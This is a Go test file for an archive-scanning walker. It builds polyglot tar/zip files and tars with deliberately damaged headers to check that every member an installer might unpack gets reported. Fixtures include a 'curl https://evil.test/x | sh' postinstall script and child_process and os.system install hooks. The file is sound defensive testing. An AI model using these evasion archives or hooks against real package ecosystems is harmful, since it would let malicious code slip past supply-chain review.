package contentscan

import (
	"archive/tar"
	"bytes"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"io"
	"reflect"
	"strings"
	"testing"
)

// Parser differentials.
//
// The walker exists so that a reviewer sees what an installer will unpack. Its
// failure mode is therefore not a crash but a disagreement: a file the walker
// reads one way and the installer another. These tests build the files that
// provoke one — a file that is two archives at once, a tar with a deliberately
// damaged header — and check that the walker reports what EVERY reading holds.

// tarMembers builds an uncompressed tar from members in the given order.
func tarMembers(members ...[2]string) []byte {
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, m := range members {
		_ = tw.WriteHeader(&tar.Header{Name: m[0], Mode: 0o644, Size: int64(len(m[1])), Typeflag: tar.TypeReg})
		_, _ = io.WriteString(tw, m[1])
	}
	_ = tw.Close()
	return buf.Bytes()
}

var polyglotOpts = ArchiveOptions{NestedDepth: 2}

// --- a file that is a zip from its end and something else from its start -------

// A zip reader starts at the end of the file; everything else at the beginning.
// A tarball with a zip appended is a tarball to npm and a wheel to pip.
func TestFileThatIsAlsoAZipFromItsEndIsReadBothWays(t *testing.T) {
	hidden := zipOf(map[string][]byte{
		"evil/__init__.py": []byte("import os\nos.system('id')\n"),
		"evil.pth":         []byte("import evil\n"),
	})
	tarball := tarOf(map[string]string{"pkg/README": "nothing to see\n", "pkg/setup.py": "from setuptools import setup\nsetup()\n"})

	heads := map[string]struct {
		data   []byte
		format string
		first  []string
	}{
		"tar":     {tarball, "tar", []string{"pkg/README", "pkg/setup.py"}},
		"tar.gz":  {gzipOf(tarball), "tar.gz", []string{"pkg/README", "pkg/setup.py"}},
		"tar.zst": {zstdOf(t, tarball), "tar.zst", []string{"pkg/README", "pkg/setup.py"}},
		"tar.xz":  {xzOf(t, tarball), "tar.xz", []string{"pkg/README", "pkg/setup.py"}},
		"cpio":    {fixture(t, "hello-newc.cpio"), "cpio", []string{"hello/bin/hello", "hello/share/README"}},
		"deb":     {fixture(t, "pthello-gzip.deb"), "deb", nil},
		"rpm":     {fixture(t, "pthello-gzip.rpm"), "rpm", nil},
		"nar":     {fixture(t, "hello.nar"), "nar", nil},
	}
	for name, head := range heads {
		t.Run(name, func(t *testing.T) {
			polyglot := append(append([]byte(nil), head.data...), hidden...)

			// The clean file, for comparison: one reading, nothing added.
			clean := walkBytes(t, head.data, testLimits, polyglotOpts)
			if clean.err != nil || clean.stats.SecondReading != "" {
				t.Fatalf("clean %s: err %v, second reading %q", name, clean.err, clean.stats.SecondReading)
			}

			w := walkBytes(t, polyglot, testLimits, polyglotOpts)
			if w.err != nil {
				t.Fatalf("walk: %v", w.err)
			}
			if w.stats.Format != head.format {
				t.Errorf("format = %q, want the head's %q", w.stats.Format, head.format)
			}
			if w.stats.SecondReading != "zip" {
				t.Fatalf("second reading = %q, want zip; files %v", w.stats.SecondReading, w.sortedNames())
			}
			// The head's reading is intact ...
			for _, n := range clean.names {
				if w.content[n] != clean.content[n] {
					t.Errorf("member %q of the head reading changed or went missing", n)
				}
			}
			for _, n := range head.first {
				if _, ok := w.files[n]; !ok {
					t.Errorf("head reading lost %q", n)
				}
			}
			// ... and the zip's members are there too, under the second reading.
			for inner, want := range map[string]string{"evil/__init__.py": "import os\nos.system('id')\n", "evil.pth": "import evil\n"} {
				if got, ok := w.content[ZipReadingPrefix+inner]; !ok || got != want {
					t.Errorf("zip reading: %q = %q (present %v), want %q", inner, got, ok, want)
				}
			}
			if len(w.names) != len(clean.names)+2 {
				t.Errorf("files = %v, want the head's %d plus the zip's 2", w.sortedNames(), len(clean.names))
			}
			for _, r := range w.stats.Incomplete {
				if r == IncompleteSecondReading {
					t.Errorf("the zip reading was examined, yet it is reported unexamined")
				}
			}
		})
	}
}

// A tarball whose LAST member is a zip also ends like a zip (the tar's own
// trailer is shorter than the window a zip reader searches). That is not an
// attack; the walker reports both readings and leaves the judging to its caller.
func TestTarEndingInAZipMemberIsReportedNotRefused(t *testing.T) {
	inner := zipOf(map[string][]byte{"lib/a.class": []byte("\xca\xfe\xba\xbe")})
	tarball := tarMembers([2]string{"pkg/index.js", "module.exports = 1\n"}, [2]string{"pkg/vendor.jar", string(inner)})
	w := walkBytes(t, tarball, testLimits, polyglotOpts)
	if w.err != nil || w.stats.Format != "tar" {
		t.Fatalf("err %v format %q", w.err, w.stats.Format)
	}
	if _, ok := w.files["pkg/vendor.jar!/lib/a.class"]; !ok {
		t.Errorf("the nested jar was not opened: %v", w.sortedNames())
	}
	if w.stats.SecondReading != "zip" {
		t.Errorf("second reading = %q, want zip (the file does open as one)", w.stats.SecondReading)
	}
	if _, ok := w.files[ZipReadingPrefix+"lib/a.class"]; !ok {
		t.Errorf("the zip reading's member is missing: %v", w.sortedNames())
	}
	if !w.stats.Complete() {
		t.Errorf("incomplete: %v", w.stats.Incomplete)
	}
}

// Bytes that only look like another format in front of a zip — zero padding
// reads as an empty tar — leave the zip as the one reading there is.
func TestHeadThatYieldsNothingInFrontOfAZipIsAPrefix(t *testing.T) {
	zipped := zipOf(map[string][]byte{"__main__.py": []byte("print('hi')\n"), "lib/x.py": []byte("X = 1\n")})
	for name, prefix := range map[string][]byte{
		"zero padding (an empty tar)":       make([]byte, 2048),
		"one zero block":                    make([]byte, 512),
		"a gzip signature and nothing else": append([]byte{0x1f, 0x8b, 0x08, 0x00}, bytes.Repeat([]byte{0xff}, 60)...),
		"an xz signature and nothing else":  append([]byte("\xfd7zXZ\x00"), bytes.Repeat([]byte{0xee}, 60)...),
	} {
		t.Run(name, func(t *testing.T) {
			data := append(append([]byte(nil), prefix...), zipped...)
			w := walkBytes(t, data, testLimits, polyglotOpts)
			if w.err != nil {
				t.Fatalf("walk: %v", w.err)
			}
			if w.stats.Format != "zip" || w.stats.SecondReading != "" {
				t.Errorf("format %q, second reading %q; want a plain (prefixed) zip", w.stats.Format, w.stats.SecondReading)
			}
			if w.stats.PrefixBytes != int64(len(prefix)) {
				t.Errorf("prefix bytes = %d, want %d", w.stats.PrefixBytes, len(prefix))
			}
			if w.content["__main__.py"] != "print('hi')\n" || w.content["lib/x.py"] != "X = 1\n" {
				t.Errorf("zip members not at the root: %v", w.sortedNames())
			}
			if f, ok := w.files[PrefixEntryName]; !ok || !f.Synthetic || f.Size != int64(len(prefix)) {
				t.Errorf("prefix entry = %+v (present %v), want a composed entry of %d bytes", f, ok, len(prefix))
			}
		})
	}
}

// The four signature bytes alone are not a zip: they turn up in data. Nothing
// is added, and nothing is flagged, for a file that merely contains them.
func TestEndOfDirectorySignatureAloneIsNotAZip(t *testing.T) {
	for name, trailer := range map[string]string{
		"bare signature":              "PK\x05\x06",
		"signature with a short tail": "PK\x05\x06\x00\x00\x00\x00",
		"record describing no entries": "PK\x05\x06" + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" +
			"\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x00\x00",
		"record whose directory lies beyond the file": "PK\x05\x06" + "\x00\x00\x00\x00" + "\x01\x00\x01\x00" +
			"\x2e\x00\x00\x00" + "\xff\xff\xff\x7f" + "\x00\x00",
		"record on another disk": "PK\x05\x06" + "\x01\x00\x01\x00" + "\x01\x00\x01\x00" +
			"\x2e\x00\x00\x00" + "\x00\x00\x00\x00" + "\x00\x00",
	} {
		t.Run(name, func(t *testing.T) {
			tarball := tarMembers([2]string{"pkg/a.txt", "a\n"}, [2]string{"pkg/blob.bin", "data " + trailer})
			w := walkBytes(t, tarball, testLimits, polyglotOpts)
			if w.err != nil || !w.stats.Complete() || w.stats.SecondReading != "" {
				t.Fatalf("err %v, incomplete %v, second reading %q; want an ordinary complete tar", w.err, w.stats.Incomplete, w.stats.SecondReading)
			}
			if !reflect.DeepEqual(w.sortedNames(), []string{"pkg/a.txt", "pkg/blob.bin"}) {
				t.Errorf("files = %v", w.sortedNames())
			}
		})
	}
}

func TestPlausibleZipEnd(t *testing.T) {
	real := zipOf(map[string][]byte{"a.txt": []byte("a")})
	if !plausibleZipEnd(real, int64(len(real))) {
		t.Error("a real zip's end was not recognized")
	}
	// The same zip behind a megabyte of prefix, seen through its last bytes only.
	if !plausibleZipEnd(real, int64(len(real))+1<<20) {
		t.Error("a prefixed zip's end was not recognized")
	}
	// With an archive comment.
	commented := append(append([]byte(nil), real...), []byte("a comment")...)
	binary.LittleEndian.PutUint16(commented[len(real)-2:], 9)
	if !plausibleZipEnd(commented, int64(len(commented))) {
		t.Error("a zip with an archive comment was not recognized")
	}
	// A comment length running past the end of the file is not a record.
	truncated := append([]byte(nil), real...)
	binary.LittleEndian.PutUint16(truncated[len(real)-2:], 500)
	if plausibleZipEnd(truncated, int64(len(truncated))) {
		t.Error("a record whose comment runs past the end of the file was accepted")
	}
	for _, junk := range [][]byte{nil, []byte("PK"), []byte("PK\x05\x06"), bytes.Repeat([]byte("PK\x05\x06"), 100)} {
		if plausibleZipEnd(junk, int64(len(junk))) {
			t.Errorf("plausibleZipEnd(%q) = true", junk)
		}
	}
}

// An artifact too large to keep for a second pass, with no random access, that
// ends like a zip: the walker cannot open that reading, and must say so rather
// than report a complete walk.
func TestZipReadingThatCannotBeExaminedIsReported(t *testing.T) {
	hidden := zipOf(map[string][]byte{"evil.py": []byte("import os\n")})
	// A tar larger than secondReadingCap: one big member.
	big := tarMembers([2]string{"pkg/a.txt", "a\n"}, [2]string{"pkg/big.bin", strings.Repeat("\x01\x02\x03\x04", (secondReadingCap+4096)/4)})
	polyglot := append(big, hidden...)
	lim := testLimits
	lim.MaxArchiveBytes = int64(len(polyglot)) + 1
	lim.MaxUnpackedBytes = 4 * lim.MaxArchiveBytes

	w := walkBytes(t, polyglot, lim, polyglotOpts)
	if w.err != nil || w.stats.Format != "tar" {
		t.Fatalf("err %v format %q", w.err, w.stats.Format)
	}
	found := false
	for _, r := range w.stats.Incomplete {
		found = found || r == IncompleteSecondReading
	}
	if !found || w.stats.SecondReading != "zip" || w.stats.Complete() {
		t.Fatalf("incomplete = %v, second reading %q; want the unexamined zip reading reported", w.stats.Incomplete, w.stats.SecondReading)
	}
	if _, ok := w.files[ZipReadingPrefix+"evil.py"]; ok {
		t.Error("the zip reading was examined after all; this test no longer covers the unexaminable case")
	}

	// With random access for a second look, the same file is examined in full.
	opts := polyglotOpts
	opts.Reread, opts.Size = bytes.NewReader(polyglot), int64(len(polyglot))
	again := walkBytes(t, polyglot, lim, opts)
	if again.err != nil || again.stats.SecondReading != "zip" {
		t.Fatalf("with Reread: err %v, second reading %q", again.err, again.stats.SecondReading)
	}
	if again.content[ZipReadingPrefix+"evil.py"] != "import os\n" {
		t.Errorf("with Reread the zip reading's member is missing: %v", again.sortedNames())
	}
	for _, r := range again.stats.Incomplete {
		if r == IncompleteSecondReading {
			t.Error("with Reread the zip reading is still reported unexamined")
		}
	}

	// Reread is trusted only when it describes the stream that was walked.
	opts.Size = int64(len(polyglot)) - 7
	wrong := walkBytes(t, polyglot, lim, opts)
	if _, ok := wrong.files[ZipReadingPrefix+"evil.py"]; ok {
		t.Error("Reread with a size that does not match the stream was used")
	}
	if wrong.stats.Complete() {
		t.Error("an unexaminable zip reading went unreported when Reread could not be trusted")
	}
}

// A second reading is bounded like the first: it shares the walk's limits.
func TestSecondReadingSharesTheLimits(t *testing.T) {
	members := map[string][]byte{}
	for i := 0; i < 50; i++ {
		members[fmt.Sprintf("f%03d.txt", i)] = []byte("x\n")
	}
	polyglot := append(tarMembers([2]string{"pkg/a.txt", "a\n"}), zipOf(members)...)
	lim := testLimits
	lim.MaxFiles = 10
	w := walkBytes(t, polyglot, lim, polyglotOpts)
	if w.err != nil {
		t.Fatalf("walk: %v", w.err)
	}
	if len(w.names) > 10 {
		t.Errorf("%d files reported against a limit of 10", len(w.names))
	}
	if w.stats.Complete() {
		t.Error("the member limit cut the second reading short without being reported")
	}

	// A directory declaring far more members than the limit is not opened at all.
	many := map[string][]byte{}
	for i := 0; i < 4*10+zipDirectorySlack+50; i++ {
		many[fmt.Sprintf("d/%05d", i)] = nil
	}
	bomb := append(tarMembers([2]string{"pkg/a.txt", "a\n"}), zipOf(many)...)
	lim.MaxArchiveBytes = int64(len(bomb)) + 1
	wb := walkBytes(t, bomb, lim, polyglotOpts)
	if wb.err != nil {
		t.Fatalf("walk: %v", wb.err)
	}
	if len(wb.names) != 1 {
		t.Errorf("files = %d, want only the tar's one member", len(wb.names))
	}
	bombReported := false
	for _, r := range wb.stats.Incomplete {
		bombReported = bombReported || r == IncompleteZipDirectory
	}
	if !bombReported {
		t.Errorf("incomplete = %v, want the oversized zip directory reported", wb.stats.Incomplete)
	}
}

// --- a zip from its start that is also a tar from its start ----------------------

// zipThatIsAlsoATar builds a file whose first 512 bytes are at once a zip local
// file header (signature, sizes, a 482-byte member name) and a tar header with
// a valid checksum. A zip reader sees one member holding zipData; a tar
// extractor sees a member of the same bytes followed by tarExtra — members the
// zip's directory never mentions.
func zipThatIsAlsoATar(t *testing.T, zipData string, tarExtra ...[2]string) []byte {
	t.Helper()
	// A tar holding the first member (whose data doubles as the zip member's)
	// and the extras; its first block is rewritten below.
	members := append([][2]string{{"placeholder", zipData}}, tarExtra...)
	file := tarMembers(members...)
	block := file[:512]

	// The zip local header occupies the first 30 bytes; the member's "name" is
	// the rest of the block, so that its data starts exactly where the tar
	// member's does.
	const nameLen = 512 - 30
	crc := crc32.ChecksumIEEE([]byte(zipData))
	local := make([]byte, 30)
	copy(local, "PK\x03\x04")
	binary.LittleEndian.PutUint16(local[4:], 20) // version needed
	binary.LittleEndian.PutUint16(local[8:], 0)  // stored
	binary.LittleEndian.PutUint32(local[14:], crc)
	binary.LittleEndian.PutUint32(local[18:], uint32(len(zipData)))
	binary.LittleEndian.PutUint32(local[22:], uint32(len(zipData)))
	binary.LittleEndian.PutUint16(local[26:], nameLen)
	copy(block, local)
	for i := 30; i < 100; i++ {
		block[i] = 0 // the rest of the tar name field
	}
	// Recompute the tar checksum over the rewritten block.
	copy(block[148:156], "        ")
	sum := 0
	for _, c := range block {
		sum += int(c)
	}
	copy(block[148:156], fmt.Sprintf("%06o\x00 ", sum))
	if !looksLikeTarBlock(block) {
		t.Fatal("the constructed block is not a valid tar header")
	}

	// The zip's central directory, after everything the tar holds.
	name := append([]byte(nil), block[30:512]...)
	var cd bytes.Buffer
	cd.WriteString("PK\x01\x02")
	_ = binary.Write(&cd, binary.LittleEndian, []uint16{20, 20, 0, 0, 0, 0})
	_ = binary.Write(&cd, binary.LittleEndian, []uint32{crc, uint32(len(zipData)), uint32(len(zipData))})
	_ = binary.Write(&cd, binary.LittleEndian, []uint16{nameLen, 0, 0, 0, 0})
	_ = binary.Write(&cd, binary.LittleEndian, []uint32{0, 0}) // external attributes, local header offset
	cd.Write(name)
	out := append([]byte(nil), file...)
	cdOffset := len(out)
	out = append(out, cd.Bytes()...)
	var eocd bytes.Buffer
	eocd.WriteString("PK\x05\x06")
	_ = binary.Write(&eocd, binary.LittleEndian, []uint16{0, 0, 1, 1})
	_ = binary.Write(&eocd, binary.LittleEndian, []uint32{uint32(cd.Len()), uint32(cdOffset)})
	_ = binary.Write(&eocd, binary.LittleEndian, uint16(0))
	return append(out, eocd.Bytes()...)
}

// A file can also be two archives from the same end: a zip whose first block is
// a valid tar header. RubyGems, Hex and a container runtime read from the first
// byte as a tar; a zip reader follows the directory. The members the tar holds
// beyond the first are in no zip directory — and must still be reported.
func TestZipThatIsAlsoATarIsReadBothWays(t *testing.T) {
	polyglot := zipThatIsAlsoATar(t, "harmless content\n",
		[2]string{"package/postinstall.sh", "#!/bin/sh\ncurl https://evil.test/x | sh\n"},
		[2]string{"package/package.json", `{"scripts":{"postinstall":"sh postinstall.sh"}}` + "\n"},
	)
	if sniffContainer(polyglot[:512]) != containerZip {
		t.Fatal("the fixture does not sniff as a zip")
	}

	for name, opts := range map[string]ArchiveOptions{
		"from the stream":       polyglotOpts,
		"through random access": {NestedDepth: 2, ReaderAt: bytes.NewReader(polyglot), Size: int64(len(polyglot))},
	} {
		t.Run(name, func(t *testing.T) {
			w := walkBytes(t, polyglot, testLimits, opts)
			if w.err != nil {
				t.Fatalf("walk: %v", w.err)
			}
			if w.stats.Format != "zip" || w.stats.SecondReading != "tar" {
				t.Fatalf("format %q, second reading %q; want zip + tar", w.stats.Format, w.stats.SecondReading)
			}
			// The zip reading: its one member.
			zipMembers := 0
			for _, n := range w.names {
				if !strings.HasPrefix(n, TarReadingPrefix) {
					zipMembers++
					if w.content[n] != "harmless content\n" {
						t.Errorf("zip member %q = %q", n, w.content[n])
					}
				}
			}
			if zipMembers != 1 {
				t.Errorf("zip reading has %d members, want 1: %q", zipMembers, w.sortedNames())
			}
			// The tar reading: what only a tar extractor unpacks.
			if got := w.content[TarReadingPrefix+"package/postinstall.sh"]; got != "#!/bin/sh\ncurl https://evil.test/x | sh\n" {
				t.Errorf("the member hidden from the zip directory was not reported: %q", w.sortedNames())
			}
			if _, ok := w.files[TarReadingPrefix+"package/package.json"]; !ok {
				t.Errorf("tar reading lost package.json: %q", w.sortedNames())
			}
		})
	}

	// An ordinary zip is not a tar, and is not read as one.
	plain := walkBytes(t, zipOf(map[string][]byte{"a.txt": []byte("a\n")}), testLimits, polyglotOpts)
	if plain.stats.SecondReading != "" || len(plain.names) != 1 {
		t.Errorf("an ordinary zip: second reading %q, files %v", plain.stats.SecondReading, plain.names)
	}
}

// --- a tar with a damaged header --------------------------------------------------

// node-tar (npm) skips a header block that fails its checksum and carries on;
// GNU tar "skips to the next header". Go's reader, Python's tarfile and
// libarchive stop. A member behind a deliberately damaged header is therefore
// installed by npm and was never seen by a walker that stops at the damage.
func TestTarWithADamagedHeaderIsResynchronized(t *testing.T) {
	whole := tarMembers(
		[2]string{"package/index.js", "module.exports = 1\n"},
		[2]string{"package/decoy.txt", "decoy\n"},
		[2]string{"package/postinstall.js", "require('child_process').exec('id')\n"},
		[2]string{"package/package.json", `{"scripts":{"postinstall":"node postinstall.js"}}` + "\n"},
	)
	// Members are one header block and one data block each: the second member's
	// header is the third block.
	damage := func(mutate func(block []byte)) []byte {
		out := append([]byte(nil), whole...)
		mutate(out[1024:1536])
		return out
	}
	cases := map[string][]byte{
		"a checksum that does not match": damage(func(b []byte) { b[0] ^= 0x20 }),
		"a header of garbage": damage(func(b []byte) {
			for i := range b {
				b[i] = byte(0xa5 ^ i)
			}
		}),
		"a header that is not octal": damage(func(b []byte) { copy(b[124:136], "zzzzzzzzzzz\x00") }),
	}
	for name, data := range cases {
		for _, wrap := range []string{"tar", "tar.gz"} {
			t.Run(name+"/"+wrap, func(t *testing.T) {
				artifact := data
				if wrap == "tar.gz" {
					artifact = gzipOf(data)
				}
				w := walkBytes(t, artifact, testLimits, polyglotOpts)
				if w.err != nil {
					t.Fatalf("walk: %v", w.err)
				}
				if w.stats.Format != wrap {
					t.Errorf("format = %q, want %q", w.stats.Format, wrap)
				}
				// What precedes the damage, and — the point — what follows it.
				for _, n := range []string{"package/index.js", "package/postinstall.js", "package/package.json"} {
					if _, ok := w.files[n]; !ok {
						t.Errorf("%q is missing: %q", n, w.sortedNames())
					}
				}
				if w.content["package/postinstall.js"] != "require('child_process').exec('id')\n" {
					t.Errorf("postinstall.js = %q", w.content["package/postinstall.js"])
				}
				// The damage is evidence, and is reported.
				malformed := false
				for _, r := range w.stats.Incomplete {
					malformed = malformed || r == IncompleteMalformed
				}
				if !malformed {
					t.Errorf("incomplete = %v, want the damage reported", w.stats.Incomplete)
				}
			})
		}
	}

	// The undamaged archive is complete and unremarkable.
	clean := walkBytes(t, whole, testLimits, polyglotOpts)
	if clean.err != nil || !clean.stats.Complete() || len(clean.names) != 4 {
		t.Fatalf("clean tar: err %v, incomplete %v, files %v", clean.err, clean.stats.Incomplete, clean.names)
	}
}

// A single zero block is half an end-of-archive marker. Go's reader treats what
// follows it as an error; node-tar reads straight on.
func TestTarWithALoneZeroBlockIsReadOn(t *testing.T) {
	first := tarMembers([2]string{"package/index.js", "module.exports = 1\n"})
	second := tarMembers([2]string{"package/postinstall.js", "require('child_process').exec('id')\n"}, [2]string{"package/late.txt", "late\n"})
	// first minus its two end-of-archive blocks, one zero block, then the rest.
	data := append(append(append([]byte(nil), first[:len(first)-1024]...), make([]byte, 512)...), second...)

	for _, tc := range []struct {
		name string
		data []byte
	}{{"in the middle", data}, {"at the very start", append(make([]byte, 512), second...)}} {
		t.Run(tc.name, func(t *testing.T) {
			w := walkBytes(t, tc.data, testLimits, polyglotOpts)
			if w.err != nil {
				t.Fatalf("walk: %v", w.err)
			}
			for _, n := range []string{"package/postinstall.js", "package/late.txt"} {
				if _, ok := w.files[n]; !ok {
					t.Errorf("%q, behind the lone zero block, is missing: %q", n, w.sortedNames())
				}
			}
			if w.stats.Complete() {
				t.Error("a tar with a stray zero block between members is reported as well-formed")
			}
		})
	}
}

// Resynchronizing is bounded by the walk's limits like everything else, and
// terminates on input that never yields a header again.
func TestTarResyncTerminates(t *testing.T) {
	head := tarMembers([2]string{"a.txt", "a\n"})
	junk := bytes.Repeat([]byte{0xa5, 0x5a, 0x3c, 0xc3}, (1<<20)/4)
	data := append(append([]byte(nil), head[:1024]...), junk...)
	w := walkBytes(t, data, testLimits, polyglotOpts)
	if w.err != nil {
		t.Fatalf("walk: %v", w.err)
	}
	if !reflect.DeepEqual(w.names, []string{"a.txt"}) {
		t.Errorf("files = %q", w.names)
	}
	if w.stats.Complete() {
		t.Error("a megabyte of junk after the first member went unreported")
	}

	// Junk blocks that each carry a valid checksum but describe nothing readable:
	// every one is tried as a header, none loops.
	var blocks bytes.Buffer
	blocks.Write(head[:1024])
	for i := 0; i < 200; i++ {
		b := make([]byte, 512)
		copy(b, fmt.Sprintf("member-%03d", i))
		copy(b[124:136], "zzzzzzzzzzz\x00") // a size no reader accepts
		copy(b[148:156], "        ")
		sum := 0
		for _, c := range b {
			sum += int(c)
		}
		copy(b[148:156], fmt.Sprintf("%06o\x00 ", sum))
		blocks.Write(b)
	}
	blocks.Write(tarMembers([2]string{"z.txt", "z\n"}))
	w2 := walkBytes(t, blocks.Bytes(), testLimits, polyglotOpts)
	if w2.err != nil {
		t.Fatalf("walk: %v", w2.err)
	}
	if _, ok := w2.files["z.txt"]; !ok {
		t.Errorf("the member after 200 unreadable headers is missing: %q", w2.names)
	}
}

// Bytes that are not a tar at all are still "not a tar": resynchronizing does
// not turn garbage with one lucky block into an archive.
func TestNotATarIsStillNotATar(t *testing.T) {
	// A block with a valid checksum whose fields no reader accepts, and nothing
	// after it that is a header.
	b := make([]byte, 512)
	copy(b, "looks-like-a-name")
	copy(b[124:136], "zzzzzzzzzzz\x00")
	copy(b[148:156], "        ")
	sum := 0
	for _, c := range b {
		sum += int(c)
	}
	copy(b[148:156], fmt.Sprintf("%06o\x00 ", sum))
	data := append(b, bytes.Repeat([]byte{0x77}, 4096)...)
	if sniffContainer(data[:512]) != containerTar {
		t.Fatal("the fixture does not sniff as a tar")
	}
	w := walkBytes(t, data, testLimits, ArchiveOptions{})
	if w.err == nil {
		t.Fatalf("walk succeeded with files %q; want an error for bytes that are no archive", w.names)
	}
	if len(w.names) != 0 {
		t.Errorf("files = %q", w.names)
	}
}
